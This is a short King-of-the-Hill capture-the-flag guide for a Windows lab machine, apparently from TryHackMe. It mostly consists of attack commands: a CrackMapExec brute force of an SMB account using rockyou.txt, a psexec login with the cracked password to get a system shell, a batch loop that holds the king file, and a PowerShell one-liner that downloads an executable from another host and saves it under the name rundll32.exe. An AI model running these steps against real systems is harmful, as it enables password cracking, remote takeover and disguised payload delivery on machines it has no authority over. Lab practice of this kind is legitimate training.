# H1: Medium KOTH Guide

A direct way in is to crack the password for the achilles user via brute force, then use psexec to get a system shell.

1. Setup a crack map exec docker instance: `docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec`
2. place rockyou.txt in .cme locally, then inside the container run `cme smb 10.10.63.150 -u achilles -p /root/.cme/rockyou.txt`
3. connect to the target machine using psexec: `psexec.py TROY.thm/achilles:winniethepooh@10.10.63.150`

As seen, a password recovered is `winniethepooh`. This has been consistent across two games.

`king.txt` is at `c:\king.txt`

For a chattr loop like thing, use:

```
:loop
attrib -r -a -h -s c:\king.txt
echo Aquinas > c:\king.txt
goto loop
```

in a batch file, and run with `START /b sys.bat` (or whatever you name it) 

## Tools

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/client.exe','c:\users\administrator\music\rundll32.exe')"
attrib +r king.txt
```

## Flags

- C:\Users\achilles\Desktop\flag.txt
- C:\Users\agamemnon\Desktop\flag.txt
- C:\Users\hector\Desktop\flag.txt
- C:\Users\helen\Desktop\flag.txt
- C:\Users\patrocles\Desktop\flag.txt
